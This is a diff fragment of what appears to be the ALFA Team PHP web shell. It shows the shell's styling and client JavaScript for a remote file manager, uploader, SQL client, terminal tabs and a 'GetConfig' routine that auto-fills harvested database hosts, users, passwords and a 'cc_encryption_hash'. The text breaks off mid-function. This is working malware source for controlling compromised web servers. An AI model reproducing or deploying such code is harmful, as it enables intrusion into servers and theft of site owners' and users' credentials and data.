.tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#009688}.tab-is-done{animation:2s tab_change_color infinite step-end}.stopAjax{color:#fff;font-size:20px;display:inline-block;padding:10px;cursor:pointer}#a_loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:99}.fmanager-row>td{position:relative}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#0f304a;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid #8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#0f0;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.editor-contents.editor-content-active{display:block}.history-panel-controller{position:absolute;color:#fff;padding:10px;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687;cursor:pointer}.sql-content{display:none;position:relative;min-height:300px}.sql-content.sql-active-content{display:block}.pages-holder{padding:7px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content{height:100%}.terminal-content,.terminal-tab{display:none}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#009688;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:alert-shake .5s ease-in-out;animation:alert-shake .5s ease-in-out}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:solid 2px #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:solid 2px #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:green}}@-webkit-keyframes alert-shake{0%{-webkit-transform:translateX(0)}20%{-webkit-transform:translateX(-10px)}40%{-webkit-transform:translateX(10px)}60%{-webkit-transform:translateX(-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes alert-shake{0%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)}}.textEffect{position:absolute;width:500px;top:-10px;animation:alert-shake .5s ease-in-out;animation-iteration-count:2}.alfateam-loader-text{position:absolute;color:#46bb45;top:23%;left:49%;transform:translate(-50%,-50%);font-size:40px;letter-spacing:7px}.alfa-ajax-error{position:absolute;color:#ff0a0a;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:1px solid #0e304a;color:#67abdf;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:7px;color:#0f0;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-hide-content{display:none}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #0f304a}.mysql-main .tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div:hover{background-color:#a23939}.mysql-query-result-tabs div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #0e304a}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:7px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-7px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{list-style-type:none;margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.hide-db-tables{display:none}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#alfa-copyright{margin-top:15px}.ic_b_plus{background-image:url(http://solevisible.com/icons/menu/b_plus.png)}.ic_b_minus{background-image:url(http://solevisible.com/icons/menu/b_minus.png)}
+<?php echo '
 @keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
 @-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
 @-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
 @-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
 #alfaloader{'.$csscode.'width:100px;height:100px;}
-#a_loader{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 42%;left: 45%;display:none;}
-.ajaxarea{border:1px solid #0E304A;color:#67ABDF}#up_bar{background-color:red;width:0;height:2px;display:none;position:fixed;z-index:100000}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;border:1px solid #0F0;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
-.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'
-.main th{text-align:left;}
-.main a{color: #FFF;}
-.main tr:hover{background-color:#646464;}
-.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }
-.bigarea{ width:99%; height:300px; }
-'.alfaCssLoadColors().'
+#a_loader img{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
+.ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
+.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
 </style>';
 echo "<script type='text/javascript'>
 var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
-var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
+var a_ = '" . htmlspecialchars(@$_POST['a']) ."';
 var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
-var alfa1_ = '" . ((strpos(@$_POST['alfa1'],"\n")!==false)?'':htmlspecialchars($_POST['alfa1'],ENT_QUOTES)) ."';
-var alfa2_ = '" . ((strpos(@$_POST['alfa2'],"\n")!==false)?'':htmlspecialchars($_POST['alfa2'],ENT_QUOTES)) ."';
-var alfa3_ = '" . ((strpos(@$_POST['alfa3'],"\n")!==false)?'':htmlspecialchars($_POST['alfa3'],ENT_QUOTES)) ."';
-var alfa4_ = '" . ((strpos(@$_POST['alfa4'],"\n")!==false)?'':htmlspecialchars($_POST['alfa4'],ENT_QUOTES)) ."';
-var alfa5_ = '" . ((strpos(@$_POST['alfa5'],"\n")!==false)?'':htmlspecialchars($_POST['alfa5'],ENT_QUOTES)) ."';
-var alfa6_ = '" . ((strpos(@$_POST['alfa6'],"\n")!==false)?'':htmlspecialchars($_POST['alfa6'],ENT_QUOTES)) ."';
-var alfa7_ = '" . ((strpos(@$_POST['alfa7'],"\n")!==false)?'':htmlspecialchars($_POST['alfa7'],ENT_QUOTES)) ."';
-var alfa8_ = '" . ((strpos(@$_POST['alfa8'],"\n")!==false)?'':htmlspecialchars($_POST['alfa8'],ENT_QUOTES)) ."';
-var alfa9_ = '" . ((strpos(@$_POST['alfa9'],"\n")!==false)?'':htmlspecialchars($_POST['alfa9'],ENT_QUOTES)) ."';
-var alfa10_ = '" . ((strpos(@$_POST['alfa10'],"\n")!==false)?'':htmlspecialchars($_POST['alfa10'],ENT_QUOTES)) ."';
-var d = document;
-var mysql_cache = {};
-var editor_files = {};
-var editor_error = true;
-var editor_current_file = '';
-var is_minimized = false;
-var cgi_is_minimized = false;
-var cgi_lang = '';
-var upcount = 1;
 var islinux = ".($GLOBALS['sys']!="win"?'true':'false').";
-var post_encryption_mode = ".(__ALFA_POST_ENCRYPTION__?'true':'false').";
-function set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset) {
-if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
-if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;";
-for($j=1;$j<=10;$j++){
-echo 'if(alfa'.$j.'!=null)d.mf.alfa'.$j.'.value=alfa'.$j.';else d.mf.alfa'.$j.'.value=alfa'.$j.'_;';
-}
-echo "
-if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
-}";
-echo 'function fc(a){alfaloader("block");var b="a="+alfab64("FilesMan")+"&c="+alfab64(a.c.value)+"&alfa1="+alfab64(a.alfa1.value)+"&ajax="+alfab64("true")+"&",c="";for(i=0;i<d.files.elements.length;i++)"checkbox"==d.files.elements[i].type&&d.files.elements[i].checked&&(c+="f[]="+alfab64(d.files.elements[i].value)+"&");_Ajax(d.URL,b+c,function(a){alfaloader("none")},!0)}function initDir(a){var b="",c="";islinux&&(b="<a class=\"header_pwd\" onclick=\"g(\'FilesMan\',\'/\');\" href=\'javascript:void(0);\'>/</a>",c="/");var e=a.split("/"),f="",g="";"-1"!=e.indexOf("..")&&(e.splice(e.indexOf("..")-1,1),e.splice(e.indexOf(".."),1));for(i in e)""!=e[i]&&(f+="<a onclick=\"g(\'FilesMan\',\'"+g+e[i]+"/\');\" href=\'javascript:void(0);\' class=\"header_pwd\">"+e[i]+"/</a>",g+=e[i]+"/");$("header_cwd").innerHTML=b+f+" ";var e=c+e.join("/");e=e.replace("//","/"),d.footer_form.c.value=e,$("footer_cwd").value=e,c_=e}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(a,b,c,e){var f=!1;return window.XMLHttpRequest?f=new XMLHttpRequest:window.ActiveXObject&&(f=new ActiveXObject("Microsoft.XMLHTTP")),f?(f.onreadystatechange=function(){4==f.readyState&&200==f.status&&("function"!=typeof c?d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText:e?(d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText,c(f.responseText)):c(f.responseText))},f.open("POST",a,!0),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(b),void 0):void alert("Error !")}function handleup(a,b){var c="__fnameup";0!=b&&(c="__fnameup"+b),a.files[0].name&&($(c).innerHTML=a.files[0].name)}function u(a){alfaloader("block");a.submit.disabled=true;var av = a.a.value,cv = a.c.value,alv = a.alfa1.value,cha = a.charset.value;var b=!1;if(a.a.value=alfab64(a.a.value),a.c.value=alfab64(a.c.value),a.alfa1.value=alfab64(a.alfa1.value),a.charset.value=alfab64(a.charset.value),window.XMLHttpRequest?b=new XMLHttpRequest:window.ActiveXObject&&(b=new ActiveXObject("Microsoft.XMLHTTP")),b){var c=$("up_bar");b.upload&&(c.style.display="block",b.upload.onprogress=function(a){var b=a.position||a.loaded,d=a.totalSize||a.total,e=Math.floor(b/d*1e3)/10+"%";c.style.width=e}),b.onload=function(e){for(200===b.status?(_Ajax(d.URL,"a="+alfab64("FilesMan")+"&c="+a.c.value+"&ajax="+alfab64("true")),c.style.display="none",a.a.value=av,a.c.value=cv,a.alfa1.value=alv,a.charset.value=cha):alert("An error occurred!"),$("footerup").value="",$("__fnameup").innerHTML="";upcount;){var f=$("pfooterup_"+upcount);f&&f.parentNode.removeChild(f),upcount--}0==upcount&&upcount++,alfaloader("none"),a.submit.disabled=false},b.onerror=function(a){};var e=new FormData(a);b.open("POST",d.URL),b.send(e)}}function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),"GetConfig"!=a&&"download"!=alfa2&&(d.getElementsByClassName("ajaxarea")[0].innerHTML=\'<center><br /><img id="alfaloader" src="'.__showicon('loader').'"></img><br /><br /></center>\'),islinux&&"/"!=d.mf.c.value.substr(0,1)&&(d.mf.c.value="/"+d.mf.c.value);for(var data="a="+alfab64(a)+"&c="+alfab64(d.mf.c.value)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d.mf.c.value),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data),c!=c_&&c&&initDir(c)):(alfaloader("block"),_Ajax(d.URL,data,function(a){try{a=JSON.parse(a),a.host&&a.user&&a.dbname&&($("db_host")&&($("db_host").value=a.host),$("db_user")&&($("db_user").value=a.user),$("db_name")&&($("db_name").value=a.dbname),$("db_pw")&&($("db_pw").value=a.password),$("db_prefix")&&a.prefix&&($("db_prefix").value=a.prefix),$("cc_encryption_hash")&&a.cc_encryption_hash&&($("cc_encryption_hash").value=a.cc_encryption_hash))}catch(a){}alfaloader("none")}))}function alfaloader(a){$("a_loader").style.display=a}function fsu(a){alfaloader("block");for(var b={},c=0;c<a.elements.length;c++)"submit"!=a.elements[c].type&&(b[a.elements[c].name]=a.elements[c].value);for(c in mysql_cache)mysql_cache[c]=alfab64(mysql_cache[c]);_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("update")+"&alfa2="+alfab64(JSON.stringify(b))+"&c="+alfab64(c_)+"&charset="+mysql_cache.charset+"&type="+mysql_cache.type+"&sql_host="+mysql_cache.host+"&sql_login="+mysql_cache.user+"&sql_pass="+mysql_cache.pass+"&sql_base="+mysql_cache.db+"&sql_count="+mysql_cache.count+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},!0)}function fs(f,e){alfaloader("block");var 